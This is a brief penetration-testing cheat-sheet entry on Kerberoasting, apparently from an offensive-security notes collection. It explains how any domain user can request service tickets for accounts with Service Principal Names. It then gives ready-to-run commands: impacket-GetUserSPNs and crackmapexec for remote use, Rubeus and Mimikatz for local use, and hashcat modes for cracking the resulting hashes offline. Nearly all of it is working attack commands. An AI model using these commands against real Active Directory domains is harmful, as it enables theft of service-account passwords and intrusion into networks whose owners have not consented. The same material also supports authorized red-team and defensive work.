# Kerberoasting
Kerberoasting takes advantage of how service accounts leverage Kerberos authentication with Service Principal Names (SPNs). By default, all standard domain users can request a copy of all service accounts STs (with SPN value set) along with their correlating password hashes.

Requirements:
* User with creds
* There need to be accounts with SPN set

## Remote
`impacket-GetUserSPNs -dc-ip <IP> '<DOMAIN>/<USER>:<PASS>' -request`
`crackmapexec ldap <IP> -u '<USER>' -p '<PASS>' --kerberoasting <OUTPUT.TXT>`

## Local
`Rubeus.exe kerberoast`
`Mimikatz`

## Hashcat Mode
hashcat -m 13100 etype 23
hashcat -m 19600 etype 17
hashcat -m 19700 etype 18